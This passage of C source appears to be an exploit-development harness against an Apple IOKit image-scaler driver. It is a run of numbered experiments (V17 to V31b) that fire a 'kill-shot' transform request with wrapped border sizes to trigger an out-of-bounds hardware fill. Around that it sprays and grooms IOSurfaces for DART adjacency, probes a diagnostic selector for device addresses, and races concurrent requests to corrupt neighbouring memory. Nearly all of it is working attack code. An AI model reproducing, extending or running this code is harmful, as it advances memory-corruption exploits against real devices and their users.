            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        surf_fill_full(dst, 0x22);
        kr = Transform(acc, src, dst, opts, rects, NULL);
        LOG("[r] wrapped X=0xFFFFFFFE -> 0x%08x", kr);
        usleep(100000);
        if (!kr) surf_scan(dst, 0x22, "real-wrapX");
        CFRelease(opts);
        CFRelease(nWX);
    }
    // geometry isolation: Transform with NULL options, rect variants
    {
        uint8_t rz[0x30]; memset(rz, 0, sizeof(rz));
        kr = Transform(acc, src, dst, NULL, rz, NULL);
        LOG("[r] NULL opts, zero rects -> 0x%08x", kr);
        // guess: three 16B blocks; try w/h fixed16 at +0x00/+0x08 of each
        for (int b = 0; b < 3; b++) {
            *(uint64_t *)(rz + b*0x10 + 0x0) = 64ULL << 16;
            *(uint64_t *)(rz + b*0x10 + 0x8) = 64ULL << 16;
        }
        kr = Transform(acc, src, dst, NULL, rz, NULL);
        LOG("[r] NULL opts, fixed16 wh blocks -> 0x%08x", kr);
        // raw u32 dims variant
        memset(rz, 0, sizeof(rz));
        for (int b = 0; b < 3; b++) {
            *(uint32_t *)(rz + b*0x10 + 0x0) = 64;
            *(uint32_t *)(rz + b*0x10 + 0x4) = 64;
        }
        kr = Transform(acc, src, dst, NULL, rz, NULL);
        LOG("[r] NULL opts, u32 dims blocks -> 0x%08x", kr);
    }
    LOG("[v17] done");
}


// V20: OOB-into-adjacent-IOSurfaces experiment.
// Kill-shot W=0xFFFFFFE0 truncates to 17-bit register field (~0x1FFE0 px wide
// fill). If DART IOVA space after dst is populated by sprayed surfaces, the
// fill may write through them (controlled 0xff channels) WITHOUT faulting.
// Detection: scan sprayed surfaces for non-0x41 bytes afterwards.
#define NSPRAY 300
static IOSurfaceRef g_spray[NSPRAY];
static void p_spray_oob(void) {
    LOG("[v20] spray-OOB experiment");
    IOSurfaceRef src = make_surface(64, 64);
    IOSurfaceRef dst = make_surface(64, 64);
    if (!src || !dst) { LOG("[o] surface fail"); return; }
    IOSurfaceID si = IOSurfaceGetID(src), di = IOSurfaceGetID(dst);
    int n = 0;
    for (int i = 0; i < NSPRAY; i++) {
        g_spray[i] = make_surface(64, 64);
        if (!g_spray[i]) break;
        surf_fill_full(g_spray[i], 0x41);
        n++;
    }
    LOG("[o] sprayed %d surfaces around dst id %u", n, di);
    // proof-of-life baseline first
    surf_fill_full(dst, 0x22);
    border_payload(g_req, si, di, 2, 2, 32, 32, 32, 32);
    kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
    LOG("[o] baseline2 -> kr 0x%08x", kr);
    usleep(100000);
    if (kr != 0) { LOG("[o] baseline failed, abort"); return; }
    // kill-shot into sprayed neighborhood
    surf_fill_full(dst, 0x22);
    border_payload(g_req, si, di, 32, 32, 0xFFFFFFE0, 0xFFFFFFE0, 32, 32);
    LOG("[o] KILL-SHOT fired");
    kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
    LOG("[o] kill-shot -> kr 0x%08x (if we print this, hw survived)", kr);
    usleep(500000);
    // scan spray for corruption
    int hit = 0;
    for (int i = 0; i < n; i++) {
        uint32_t seed = 0;
        if (IOSurfaceLock(g_spray[i], kIOSurfaceLockReadOnly, &seed)) continue;
        uint8_t *b = IOSurfaceGetBaseAddress(g_spray[i]);
        size_t bpr = IOSurfaceGetBytesPerRow(g_spray[i]);
        size_t h = IOSurfaceGetHeight(g_spray[i]);
        long bad = 0;
        for (size_t j = 0; j < bpr * h; j++) if (b[j] != 0x41) bad++;
        if (bad) {
            LOG("[o] spray[%d] id %u: %ld corrupted bytes, first %02x%02x%02x%02x",
                i, IOSurfaceGetID(g_spray[i]), bad, b[0], b[1], b[2], b[3]);
            hit++;
        }
        IOSurfaceUnlock(g_spray[i], kIOSurfaceLockReadOnly, &seed);
    }
    LOG("[o] corrupted spray surfaces: %d/%d", hit, n);
    LOG("[v20] done");
}


// V21: (1) learn DVA layout via GetDiag after a mapped transform;
// (2) spray-geometry variants for DART adjacency; kill-shot per variant.
static void p_diag_dva(void) {
    LOG("[v21-d] diag DVA scan");
    // ensure surfaces are wired: one normal transform
    craft_transform(g_req, g_s1, g_s2, 64, 64);
    call_struct(1, g_req, 0x1b0, NULL, NULL);
    usleep(100000);
    size_t bufsz = 0x10000;
    uint8_t *big = must_map(bufsz);
    memset(big, 0, bufsz);
    *(uint32_t *)big = 0x6944506b;
    uint64_t va = (uint64_t)(uintptr_t)big;
    kern_return_t kr = call_struct(8, &va, 8, NULL, NULL);
    LOG("[d] sel 8 -> 0x%08x", kr);
    int found = 0;
    for (size_t i = 0; i + 8 <= bufsz && found < 40; i += 4) {
        uint64_t v = *(uint64_t *)(big + i);
        if (v >= 0x8000000000ULL && v < 0x100000000000ULL) {   // 512GB..1TB window
            LOG("[d] dva-like @+0x%zx: %016llx", i, v);
            found++;
        }
    }
    LOG("[d] dva-like count %d", found);
    vm_deallocate(mach_task_self(), (vm_address_t)big, bufsz);
}

static int scan_spray(IOSurfaceRef *arr, int n, uint8_t expect) {
    int hit = 0;
    for (int i = 0; i < n; i++) {
        uint32_t seed = 0;
        if (IOSurfaceLock(arr[i], kIOSurfaceLockReadOnly, &seed)) continue;
        uint8_t *b = IOSurfaceGetBaseAddress(arr[i]);
        size_t total = IOSurfaceGetBytesPerRow(arr[i]) * IOSurfaceGetHeight(arr[i]);
        long bad = 0, first = -1;
        for (size_t j = 0; j < total; j++) if (b[j] != expect) { if (first < 0) first = j; bad++; }
        if (bad) {
            LOG("[s] spray[%d] id %u: %ld bad bytes, first @0x%lx val %02x",
                i, IOSurfaceGetID(arr[i]), bad, first, first >= 0 ? b[first] : 0);
            hit++;
        }
        IOSurfaceUnlock(arr[i], kIOSurfaceLockReadOnly, &seed);
    }
    return hit;
}

static void killshot(IOSurfaceID si, IOSurfaceID di) {
    border_payload(g_req, si, di, 32, 32, 0xFFFFFFE0, 0xFFFFFFE0, 32, 32);
    kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
    LOG("[s] kill-shot -> kr 0x%08x", kr);
    usleep(300000);
}

static void p_spray2(void) {
    LOG("[v21-s] spray geometry variants");
    IOSurfaceRef src = make_surface(64, 64);
    if (!src) { LOG("[s] src fail"); return; }
    IOSurfaceID si = IOSurfaceGetID(src);

    // variant A: spray BEFORE dst
    {
        IOSurfaceRef pre[150]; int np = 0;
        for (int i = 0; i < 150; i++) { pre[i] = make_surface(64, 64); if (pre[i]) { surf_fill_full(pre[i], 0x41); np++; } }
        IOSurfaceRef dst = make_surface(64, 64);
        IOSurfaceRef post[150]; int nq = 0;
        for (int i = 0; i < 150; i++) { post[i] = make_surface(64, 64); if (post[i]) { surf_fill_full(post[i], 0x41); nq++; } }
        LOG("[s] A: pre %d dst id %u post %d", np, IOSurfaceGetID(dst), nq);
        killshot(si, IOSurfaceGetID(dst));
        LOG("[s] A corrupted: pre %d, post %d", scan_spray(pre, np, 0x41), scan_spray(post, nq, 0x41));
    }
    // variant B: dst between LARGE surfaces (64MB each)
    {
        IOSurfaceRef big1 = make_surface(4096, 4096);
        IOSurfaceRef dst = make_surface(64, 64);
        IOSurfaceRef big2 = make_surface(4096, 4096);
        LOG("[s] B: big1 %u dst %u big2 %u", big1 ? IOSurfaceGetID(big1) : 0,
            IOSurfaceGetID(dst), big2 ? IOSurfaceGetID(big2) : 0);
        if (big1) surf_fill_full(big1, 0x42);
        if (big2) surf_fill_full(big2, 0x42);
        killshot(si, IOSurfaceGetID(dst));
        int h1 = 0, h2 = 0;
        if (big1) { IOSurfaceRef a[1] = {big1}; h1 = scan_spray(a, 1, 0x42); }
        if (big2) { IOSurfaceRef a[1] = {big2}; h2 = scan_spray(a, 1, 0x42); }
        LOG("[s] B corrupted: big1 %d big2 %d", h1, h2);
    }
    LOG("[v21-s] done");
}


// V22: correct DART grooming — surfaces enter the scaler DART domain only
// when WIRED by a transform. Wire dst first, then wire each spray surface
// (as src into dst), then kill-shot over dst: if DART allocates ascending,
// sprays sit right after dst and the fill lands in them.
static void p_spray3(void) {
    LOG("[v22] wire-then-shoot grooming");
    IOSurfaceRef src = make_surface(64, 64);
    IOSurfaceRef dst = make_surface(64, 64);
    if (!src || !dst) { LOG("[g] surface fail"); return; }
    IOSurfaceID si = IOSurfaceGetID(src), di = IOSurfaceGetID(dst);
    // 1) wire dst (normal transform, also proves path)
    craft_transform(g_req, si, di, 64, 64);
    kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
    LOG("[g] wire dst -> kr 0x%08x", kr);
    usleep(50000);
    // 2) wire sprays as srcs (one small transform each into dst)
    IOSurfaceRef spray[200]; int n = 0;
    for (int i = 0; i < 200; i++) {
        spray[i] = make_surface(64, 64);
        if (!spray[i]) break;
        surf_fill_full(spray[i], 0x41);
        craft_transform(g_req, IOSurfaceGetID(spray[i]), di, 64, 64);
        call_struct(1, g_req, 0x1b0, NULL, NULL);
        n++;
        if ((i & 31) == 0) usleep(20000);
    }
    LOG("[g] wired %d spray surfaces", n);
    usleep(100000);
    // 3) kill-shot over dst
    killshot(si, di);
    // 4) scan
    LOG("[g] corrupted: %d", scan_spray(spray, n, 0x41));
    LOG("[v22] done (alive)");
}


// V23: intra-request / intra-surface OOB measurement
// E1: dst=420f biplanar 64x64 — fill past luma should land in chroma plane
// E2: src=4096x4096 (fill 0x43), dst=64x64 — does fill reach src?
// E3: dst=4096x4096 — how far does the fill actually write? (metrology)
static void surf_fill_alloc(IOSurfaceRef s, uint8_t v) {
    uint32_t seed = 0;
    if (IOSurfaceLock(s, 0, &seed)) return;
    memset(IOSurfaceGetBaseAddress(s), v, IOSurfaceGetAllocSize(s));
    IOSurfaceUnlock(s, 0, &seed);
}
static long scan_range(IOSurfaceRef s, uint8_t expect, size_t from, size_t to, long *first) {
    uint32_t seed = 0;
    if (IOSurfaceLock(s, kIOSurfaceLockReadOnly, &seed)) return -1;
    uint8_t *b = IOSurfaceGetBaseAddress(s);
    size_t total = IOSurfaceGetAllocSize(s);
    if (to > total) to = total;
    long bad = 0; *first = -1;
    for (size_t j = from; j < to; j++) if (b[j] != expect) { if (*first < 0) *first = j; bad++; }
    IOSurfaceUnlock(s, kIOSurfaceLockReadOnly, &seed);
    return bad;
}
static void p_oob_measure(void) {
    LOG("[v23] OOB measurement");
    IOSurfaceRef src64 = make_surface(64, 64);
    if (!src64) return;
    IOSurfaceID s64 = IOSurfaceGetID(src64);

    // E1: 420f biplanar dst
    {
        IOSurfaceRef dst = make_surface_fmt(64, 64, 1, 0x34323066);
        if (dst) {
            surf_fill_alloc(dst, 0x33);   // ENTIRE allocation incl. chroma plane
            size_t alloc = IOSurfaceGetAllocSize(dst);
            LOG("[e1] 420f dst id %u allocSize 0x%zx bpr %zu planes?",
                IOSurfaceGetID(dst), alloc, IOSurfaceGetBytesPerRow(dst));
            killshot(s64, IOSurfaceGetID(dst));
            long first = -1;
            long bad = scan_range(dst, 0x33, 0, alloc, &first);
            LOG("[e1] changed bytes in whole alloc: %ld, first @0x%lx", bad, first);
        }
    }
    // E2: huge src
    {
        IOSurfaceRef srcBig = make_surface(4096, 4096);
        IOSurfaceRef dst = make_surface(64, 64);
        if (srcBig && dst) {
            surf_fill_full(srcBig, 0x43);
            LOG("[e2] srcBig id %u allocSize 0x%zx, dst id %u",
                IOSurfaceGetID(srcBig), IOSurfaceGetAllocSize(srcBig), IOSurfaceGetID(dst));
            killshot(IOSurfaceGetID(srcBig), IOSurfaceGetID(dst));
            long first = -1;
            long bad = scan_range(srcBig, 0x43, 0, IOSurfaceGetAllocSize(srcBig), &first);
            LOG("[e2] srcBig changed: %ld bytes, first @0x%lx", bad, first);
        }
    }
    // E3: huge dst — measure fill extent
    {
        IOSurfaceRef dst = make_surface(4096, 4096);
        if (dst) {
            surf_fill_full(dst, 0x44);
            size_t alloc = IOSurfaceGetAllocSize(dst);
            LOG("[e3] dst4096 id %u allocSize 0x%zx", IOSurfaceGetID(dst), alloc);
            killshot(s64, IOSurfaceGetID(dst));
            long first = -1;
            long bad = scan_range(dst, 0x44, 0, alloc, &first);
            LOG("[e3] dst4096 changed: %ld bytes (%.1f MB), first @0x%lx",
                bad, bad / 1048576.0, first);
        }
    }
    LOG("[v23] done (alive)");
}


// V24: flip/rotate variants — try to reverse the fill direction so it walks
// into SRC's mapping (huge src) instead of unmapped space past dst.
static void p_flip420(void) {
    LOG("[v25] flip x 420f/420v dst (plane adjacency)");
    static const struct { int fmt; const char *n; } fmts[] = {
        { 0x34323066, "420f" }, { 0x34323076, "420v" },
    };
    for (int f = 0; f < 2; f++) {
        for (uint32_t t = 0; t < 4; t++) {
            IOSurfaceRef src = make_surface(64, 64);
            IOSurfaceRef dst = make_surface_fmt(64, 64, 1, fmts[f].fmt);
            if (!src || !dst) { LOG("[f4] fail %s t%u", fmts[f].n, t); continue; }
            surf_fill_alloc(dst, 0x33);
            border_payload(g_req, IOSurfaceGetID(src), IOSurfaceGetID(dst),
                           32, 32, 0xFFFFFFE0, 0xFFFFFFE0, 32, 32);
            *(uint64_t *)(g_req + 0x20) &= ~0xFULL;
            *(uint64_t *)(g_req + 0x20) |= t;
            kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
            usleep(200000);
            long first = -1;
            long bad = scan_range(dst, 0x33, 0, IOSurfaceGetAllocSize(dst), &first);
            LOG("[f4] %s t=%u -> kr 0x%08x, dst changed %ld first 0x%lx",
                fmts[f].n, t, kr, bad, first);
            CFRelease(src); CFRelease(dst);
        }
    }
    LOG("[v25] done (alive)");
}

static void p_flip(void) {
    LOG("[v24] flip/rotate kill-shot variants");
    for (uint32_t t = 0; t < 4; t++) {
        IOSurfaceRef srcBig = make_surface(2048, 2048);
        IOSurfaceRef dst = make_surface(64, 64);
        if (!srcBig || !dst) { LOG("[fl] surface fail t %u", t); continue; }
        surf_fill_alloc(srcBig, 0x43);
        surf_fill_alloc(dst, 0x22);
        border_payload(g_req, IOSurfaceGetID(srcBig), IOSurfaceGetID(dst),
                       32, 32, 0xFFFFFFE0, 0xFFFFFFE0, 32, 32);
        // Transform field: flags low bits (validated one-hot / small enum)
        *(uint64_t *)(g_req + 0x20) &= ~0xFULL;
        *(uint64_t *)(g_req + 0x20) |= t;
        kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
        LOG("[fl] t=%u -> kr 0x%08x", t, kr);
        usleep(300000);
        long f1 = -1;
        long bad = scan_range(srcBig, 0x43, 0, IOSurfaceGetAllocSize(srcBig), &f1);
        LOG("[fl] t=%u srcBig changed %ld first 0x%lx", t, bad, f1);
        CFRelease(srcBig); CFRelease(dst);
    }
    LOG("[v24] done (alive)");
}


// V26: async cushion race — keep neighbor pages mapped in the scaler DART
// domain via in-flight async transforms while the kill-shot fires.
static void p_async_cushion(void) {
    LOG("[v26] async cushion race");
    IOSurfaceRef src = make_surface(64, 64);
    IOSurfaceRef dst = make_surface(64, 64);
    IOSurfaceRef csrc = make_surface(64, 64);
    if (!src || !dst || !csrc) { LOG("[ac] surface fail"); return; }
    IOSurfaceID si = IOSurfaceGetID(src), di = IOSurfaceGetID(dst);
    IOSurfaceRef cush[8];
    int nc = 0;
    for (int i = 0; i < 8; i++) {
        cush[i] = make_surface(2048, 2048);
        if (!cush[i]) break;
        surf_fill_alloc(cush[i], 0x45);
        nc++;
    }
    LOG("[ac] %d cushions", nc);
    // wire dst
    craft_transform(g_req, si, di, 64, 64);
    call_struct(1, g_req, 0x1b0, NULL, NULL);
    usleep(50000);
    for (int round = 0; round < 10; round++) {
        // launch slow async cushions (64 -> 2048 upscale)
        for (int i = 0; i < nc; i++) {
            craft_transform(g_req, IOSurfaceGetID(csrc), IOSurfaceGetID(cush[i]), 64, 64);
            *(uint32_t *)(g_req + 0x68) = 2048;   // dst rect w (upscale)
            *(uint32_t *)(g_req + 0x6c) = 2048;
            memset(g_out, 0xAA, 0x2000);
            size_t osz = 0x2000;
            uint64_t ref = 0xca5000 + i;
            uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
            IOConnectCallAsyncMethod(g_conn, 1, g_wake, &ref, 1, NULL, 0,
                                   g_req, 0x1b0, osc, &nosc, g_out, &osz);
        }
        // fire kill-shot while cushions are (hopefully) in flight
        killshot(si, di);
    }
    for (int i = 0; i < nc; i++) {
        long first = -1;
        long bad = scan_range(cush[i], 0x45, 0, IOSurfaceGetAllocSize(cush[i]), &first);
        if (bad) LOG("[ac] cush[%d] id %u changed %ld first 0x%lx",
                     i, IOSurfaceGetID(cush[i]), bad, first);
    }
    LOG("[v26] done (alive)");
}


// V27: what does the kill-shot fill actually overwrite? Scan SRC (both small)
// after the shot; fill-color content check (0xff vs 0x01 channels).
static void p_fill_target(void) {
    LOG("[v27] fill-target analysis");
    IOSurfaceRef src = make_surface(64, 64);
    IOSurfaceRef dst = make_surface(64, 64);
    if (!src || !dst) return;
    IOSurfaceID si = IOSurfaceGetID(src), di = IOSurfaceGetID(dst);
    // wire both once
    craft_transform(g_req, si, di, 64, 64);
    call_struct(1, g_req, 0x1b0, NULL, NULL);
    usleep(50000);

    // A) fill 0xff, scan src AND dst fully
    surf_fill_alloc(src, 0x43);
    surf_fill_alloc(dst, 0x22);
    killshot(si, di);
    long f1 = -1;
    long badS = scan_range(src, 0x43, 0, IOSurfaceGetAllocSize(src), &f1);
    LOG("[t] A: src changed %ld first 0x%lx", badS, f1);
    long f2 = -1;
    long badD = scan_range(dst, 0x22, 0, IOSurfaceGetAllocSize(dst), &f2);
    LOG("[t] A: dst changed %ld first 0x%lx", badD, f2);
    if (badS) {
        uint32_t seed = 0;
        IOSurfaceLock(src, kIOSurfaceLockReadOnly, &seed);
        uint8_t *b = IOSurfaceGetBaseAddress(src);
        LOG("[t] A: src dump @first: %02x %02x %02x %02x %02x %02x %02x %02x",
            b[f1], b[f1+1], b[f1+2], b[f1+3], b[f1+4], b[f1+5], b[f1+6], b[f1+7]);
        IOSurfaceUnlock(src, kIOSurfaceLockReadOnly, &seed);
    }

    // B) fill color 0x01010101-ish (channels = 1)
    surf_fill_alloc(src, 0x43);
    surf_fill_alloc(dst, 0x22);
    border_payload(g_req, si, di, 32, 32, 0xFFFFFFE0, 0xFFFFFFE0, 32, 32);
    *(uint32_t *)(g_req + 0xbc) = 1;
    *(uint32_t *)(g_req + 0xc0) = 1;
    *(uint32_t *)(g_req + 0xc4) = 1;
    *(uint32_t *)(g_req + 0xc8) = 1;
    kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
    LOG("[t] B: color=1 kill-shot -> kr 0x%08x", kr);
    usleep(300000);
    f1 = -1;
    badS = scan_range(src, 0x43, 0, IOSurfaceGetAllocSize(src), &f1);
    LOG("[t] B: src changed %ld first 0x%lx", badS, f1);
    if (badS) {
        uint32_t seed = 0;
        IOSurfaceLock(src, kIOSurfaceLockReadOnly, &seed);
        uint8_t *b = IOSurfaceGetBaseAddress(src);
        LOG("[t] B: src dump @first: %02x %02x %02x %02x %02x %02x %02x %02x",
            b[f1], b[f1+1], b[f1+2], b[f1+3], b[f1+4], b[f1+5], b[f1+6], b[f1+7]);
        IOSurfaceUnlock(src, kIOSurfaceLockReadOnly, &seed);
    }
    LOG("[v27] done (alive)");
}


// V28: does the kill-shot fill corrupt the request's internal DMA buffers
// in an OBSERVABLE way? Compare post-shot transform output vs pre-shot
// baseline (same input -> same output expected if state is clean).
static uint64_t dst_checksum(IOSurfaceRef s) {
    uint32_t seed = 0;
    if (IOSurfaceLock(s, kIOSurfaceLockReadOnly, &seed)) return 0;
    uint8_t *b = IOSurfaceGetBaseAddress(s);
    size_t total = IOSurfaceGetBytesPerRow(s) * IOSurfaceGetHeight(s);
    uint64_t h = 1469598103934665603ULL;
    for (size_t i = 0; i < total; i++) { h ^= b[i]; h *= 1099511628211ULL; }
    IOSurfaceUnlock(s, kIOSurfaceLockReadOnly, &seed);
    return h;
}
static void p_state_corruption(void) {
    LOG("[v28] post-shot state corruption check");
    IOSurfaceRef src = make_surface(64, 64);
    IOSurfaceRef dst = make_surface(64, 64);
    if (!src || !dst) return;
    IOSurfaceID si = IOSurfaceGetID(src), di = IOSurfaceGetID(dst);
    // gradient src
    {
        uint32_t seed = 0;
        IOSurfaceLock(src, 0, &seed);
        uint8_t *b = IOSurfaceGetBaseAddress(src);
        for (size_t i = 0; i < IOSurfaceGetBytesPerRow(src) * 64; i++) b[i] = (uint8_t)(i * 7 + 3);
        IOSurfaceUnlock(src, 0, &seed);
    }
    // baseline transforms x3
    uint64_t base[3];
    for (int i = 0; i < 3; i++) {
        surf_fill_alloc(dst, 0x22);
        craft_transform(g_req, si, di, 64, 64);
        kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
        usleep(100000);
        base[i] = dst_checksum(dst);
        LOG("[c] baseline %d kr 0x%08x checksum %016llx", i, kr, base[i]);
    }
    // kill-shot
    killshot(si, di);
    // post-shot transforms x5
    for (int i = 0; i < 5; i++) {
        surf_fill_alloc(dst, 0x22);
        craft_transform(g_req, si, di, 64, 64);
        kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
        usleep(100000);
        uint64_t h = dst_checksum(dst);
        LOG("[c] post %d kr 0x%08x checksum %016llx %s", i, kr, h,
            (h == base[0]) ? "OK" : "DIFF!");
        // also try other geometry to stress different tile paths
        IOSurfaceRef dst2 = make_surface(256, 256);
        if (dst2) {
            surf_fill_alloc(dst2, 0x22);
            craft_transform(g_req, si, IOSurfaceGetID(dst2), 64, 64);
            *(uint32_t *)(g_req + 0x68) = 256;
            *(uint32_t *)(g_req + 0x6c) = 256;
            kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
            usleep(100000);
            LOG("[c] post %d upscale kr 0x%08x checksum %016llx", i, kr, dst_checksum(dst2));
            CFRelease(dst2);
        }
    }
    LOG("[v28] done (alive)");
}


// V29: calibration — place fill start INSIDE dst, observe first changed
// offset, derive the HW start formula empirically.
static void p_calibrate(void) {
    LOG("[v29] fill calibration");
    IOSurfaceRef src = make_surface(64, 64);
    IOSurfaceRef dst = make_surface(64, 64);
    if (!src || !dst) return;
    IOSurfaceID si = IOSurfaceGetID(src), di = IOSurfaceGetID(dst);
    craft_transform(g_req, si, di, 64, 64);
    call_struct(1, g_req, 0x1b0, NULL, NULL);
    usleep(50000);

    static const struct {
        uint32_t rw, rh;            // dst rect (selW, selH)
        uint32_t bx, by, bw, bh;    // border fields
        const char *n;
    } cfgs[] = {
        { 32, 16, 32, 16, 0xFFFFFFE0, 0xFFFFFFF0, "wrap-start-inside" },
        { 32, 32,  1,  1, 32, 32, "short-1" },
        { 32, 32, 16, 16, 32, 32, "short-16" },
        { 32, 32, 31, 31, 32, 32, "short-31" },
        { 32, 32,  0, 16,  0, 32, "W0-freeX" },
    };
    for (unsigned i = 0; i < sizeof(cfgs)/sizeof(cfgs[0]); i++) {
        surf_fill_alloc(dst, 0x22);
        craft_transform(g_req, si, di, 64, 64);
        *(uint32_t *)(g_req + 0x68) = cfgs[i].rw;   // dst rect w/h
        *(uint32_t *)(g_req + 0x6c) = cfgs[i].rh;
        *(uint64_t *)(g_req + 0x20) |= (1ULL << 28);
        *(uint32_t *)(g_req + 0xac) = cfgs[i].bx;
        *(uint32_t *)(g_req + 0xb0) = cfgs[i].by;
        *(uint32_t *)(g_req + 0xb4) = cfgs[i].bw;
        *(uint32_t *)(g_req + 0xb8) = cfgs[i].bh;
        *(uint32_t *)(g_req + 0xbc) = 0xff;
        *(uint32_t *)(g_req + 0xc0) = 0xff;
        *(uint32_t *)(g_req + 0xc4) = 0xff;
        *(uint32_t *)(g_req + 0xc8) = 0xff;
        kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
        usleep(300000);
        long first = -1;
        long bad = scan_range(dst, 0x22, 0, IOSurfaceGetAllocSize(dst), &first);
        LOG("[k] %s -> kr 0x%08x, dst changed %ld, first 0x%lx", cfgs[i].n, kr, bad, first);
        if (bad && first >= 0) {
            uint32_t seed = 0;
            IOSurfaceLock(dst, kIOSurfaceLockReadOnly, &seed);
            uint8_t *b = IOSurfaceGetBaseAddress(dst);
            LOG("[k] %s dump @first: %02x %02x %02x %02x %02x %02x %02x %02x",
                cfgs[i].n, b[first], b[first+1], b[first+2], b[first+3],
                b[first+4], b[first+5], b[first+6], b[first+7]);
            IOSurfaceUnlock(dst, kIOSurfaceLockReadOnly, &seed);
        }
    }
    LOG("[v29] done (alive)");
}


// V30: rotation allocates the NC (neighbor channel) buffer above src in the
// same request. Kill-shot fill should overwrite NC mid-frame; the 2nd pass
// then writes NC-derived garbage into dst -> observable in dst scan.
static void p_nc(void) {
    LOG("[v30] NC-corruption observability");
    IOSurfaceRef src = make_surface(64, 64);
    IOSurfaceRef dst = make_surface(64, 64);
    if (!src || !dst) return;
    IOSurfaceID si = IOSurfaceGetID(src), di = IOSurfaceGetID(dst);
    // gradient src for traceable output
    uint32_t seed = 0;
    IOSurfaceLock(src, 0, &seed);
    uint8_t *b = IOSurfaceGetBaseAddress(src);
    for (size_t i = 0; i < IOSurfaceGetBytesPerRow(src) * 64; i++) b[i] = (uint8_t)(i * 5 + 1);
    IOSurfaceUnlock(src, 0, &seed);

    for (uint32_t t = 0; t < 4; t++) {
        // baseline rotated transform (no border)
        surf_fill_alloc(dst, 0x22);
        craft_transform(g_req, si, di, 64, 64);
        *(uint64_t *)(g_req + 0x20) &= ~0xFULL;
        *(uint64_t *)(g_req + 0x20) |= t;
        kern_return_t kr0 = call_struct(1, g_req, 0x1b0, NULL, NULL);
        usleep(100000);
        uint64_t h0 = dst_checksum(dst);
        // kill-shot with same rotation
        surf_fill_alloc(dst, 0x22);
        border_payload(g_req, si, di, 32, 32, 0xFFFFFFE0, 0xFFFFFFE0, 32, 32);
        *(uint64_t *)(g_req + 0x20) &= ~0xFULL;
        *(uint64_t *)(g_req + 0x20) |= t;
        kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
        usleep(300000);
        long first = -1;
        long bad = scan_range(dst, 0x22, 0, IOSurfaceGetAllocSize(dst), &first);
        LOG("[nc] t=%u baseline kr 0x%08x h %016llx | shot kr 0x%08x, dst changed %ld first 0x%lx",
            t, kr0, h0, kr, bad, first);
    }
    LOG("[v30] done (alive)");
}


// V31a: triangulate the fill start address. Tall dst (64x256), wrapped H,
// varying bfY -> first changed row reveals the start formula.
static void p_triangulate(void) {
    LOG("[v31a] start triangulation (tall dst)");
    IOSurfaceRef src = make_surface(64, 64);
    IOSurfaceRef dst = make_surface(64, 256);
    if (!src || !dst) return;
    IOSurfaceID si = IOSurfaceGetID(src), di = IOSurfaceGetID(dst);
    LOG("[tr] dst 64x256 bpr %zu alloc 0x%zx", IOSurfaceGetBytesPerRow(dst), IOSurfaceGetAllocSize(dst));
    craft_transform(g_req, si, di, 64, 64);
    call_struct(1, g_req, 0x1b0, NULL, NULL);
    usleep(50000);
    static const uint32_t bfs[][2] = { {32, 0xFFFFFFE0}, {64, 0xFFFFFFE0}, {96, 0xFFFFFFE0} };
    for (unsigned i = 0; i < 3; i++) {
        surf_fill_alloc(dst, 0x22);
        border_payload(g_req, si, di, 32, bfs[i][0], 0xFFFFFFE0, bfs[i][1], 32, 32);
        // fix: border_payload sets X,Y,W,H order (x,y,w,h) = (32, bfs[i][0], ffe0, bfs[i][1])
        kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
        usleep(300000);
        long first = -1;
        long bad = scan_range(dst, 0x22, 0, IOSurfaceGetAllocSize(dst), &first);
        LOG("[tr] bfY=%u -> kr 0x%08x, changed %ld, first 0x%lx (row %ld col-byte %ld)",
            bfs[i][0], kr, bad, first, first >= 0 ? first / 256 : -1, first >= 0 ? first % 256 : -1);
    }
    LOG("[v31a] done");
}

// V31b: cross-request contamination race. T2 (this thread after shots):
// verify big-transform checksums while T1 hammers kill-shots.
static volatile int g_shot_stop;
static void *t_killhammer(void *arg) {
    IOSurfaceRef src = make_surface(64, 64);
    IOSurfaceRef dst = make_surface(64, 64);
    if (!src || !dst) return NULL;
    IOSurfaceID si = IOSurfaceGetID(src), di = IOSurfaceGetID(dst);
    uint8_t *req = must_map(0x1000);
    while (!g_shot_stop) {
        border_payload(req, si, di, 32, 32, 0xFFFFFFE0, 0xFFFFFFE0, 32, 32);
        IOConnectCallMethod(g_conn, 1, NULL, 0, req, 0x1b0, NULL, NULL, NULL, NULL);
        usleep(2000);
    }
    return NULL;
}
static void p_cross_race(int seconds) {
    LOG("[v31b] cross-request race %ds", seconds);
    IOSurfaceRef src = make_surface(64, 64);
    IOSurfaceRef dst = make_surface(1024, 1024);
    if (!src || !dst) return;
    IOSurfaceID si = IOSurfaceGetID(src), di = IOSurfaceGetID(dst);
    // fixed src pattern
    uint32_t seed = 0;
    IOSurfaceLock(src, 0, &seed);
    uint8_t *b = IOSurfaceGetBaseAddress(src);
    for (size_t i = 0; i < IOSurfaceGetBytesPerRow(src) * 64; i++) b[i] = (uint8_t)(i * 3 + 7);
    IOSurfaceUnlock(src, 0, &seed);
    // expected checksum
    craft_transform(g_req, si, di, 64, 64);
    *(uint32_t *)(g_req + 0x68) = 1024;
    *(uint32_t *)(g_req + 0x6c) = 1024;
    kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
    usleep(200000);
    uint64_t expect = dst_checksum(dst);
    LOG("[cr] expected checksum %016llx (kr 0x%08x)", expect, kr);

    g_shot_stop = 0;
    pthread_t th;
    pthread_create(&th, NULL, t_killhammer, NULL);
    long iter = 0, corrupt = 0;
    time_t t0 = time(NULL);
    while (time(NULL) - t0 < seconds) {
        craft_transform(g_req, si, di, 64, 64);
        *(uint32_t *)(g_req + 0x68) = 1024;
        *(uint32_t *)(g_req + 0x6c) = 1024;
